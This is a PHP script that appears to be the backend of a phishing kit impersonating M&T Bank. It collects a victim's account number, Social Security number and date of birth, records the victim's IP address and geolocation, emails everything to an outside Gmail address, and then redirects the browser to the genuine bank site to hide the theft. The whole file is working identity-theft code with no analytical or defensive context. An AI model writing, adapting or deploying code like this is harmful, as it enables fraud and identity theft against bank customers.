<?php
	
	$email = $_POST['username'];
	$passwd = $_POST['password'];
	$cid = $_POST['company'];
	$login = $_POST['user'];
	$pass = $_POST['pass'];
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
    $message .= "---|Ghost Rider|---\n";
    $message .= "Account Number: " . $_POST['300'] . "\n"; 
    $message .= "Social Security: " . $_POST['400'] . "\n"; 
    $message .= "DOB: " . $_POST['500'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$send ="godgreat973@gmail.com";

	$subject = "M&T";
	$headers = "From: Result@pedro.com";

	{
	mail("$send",$subject,$message,$headers);
	}
?>
<script>
	window.location="https://www3.mtb.com/";
</script>

